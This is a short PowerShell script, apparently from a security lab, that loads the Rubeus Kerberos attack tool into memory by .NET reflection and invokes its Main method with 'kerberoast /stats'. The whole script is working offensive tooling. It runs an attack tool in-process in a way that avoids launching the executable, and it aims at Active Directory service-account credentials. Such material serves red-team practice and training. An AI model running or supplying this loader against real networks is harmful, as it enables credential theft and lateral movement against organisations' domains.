$assemblyPath = "C:\THEV\Labs\PSloader\Rubeus.exe"

try {
    # Load the assembly
    [System.Reflection.Assembly]::LoadFrom($assemblyPath)

    # Specify the namespace and class
    $namespace = "Rubeus"
    $className = "Program"

    # Create an instance of the class (if required)
    $type = "${namespace}.${className}"
    $object = New-Object $type

    # Invoke the Main method (adjust arguments as needed)
    $arguments = @("kerberoast", "/stats") # Example arguments
    $result = [Rubeus.Program]::Main($arguments)

    Write-Output "Rubeus executed successfully. Result: $result"
}
catch {
    Write-Error "Error loading or executing Rubeus: $_"
}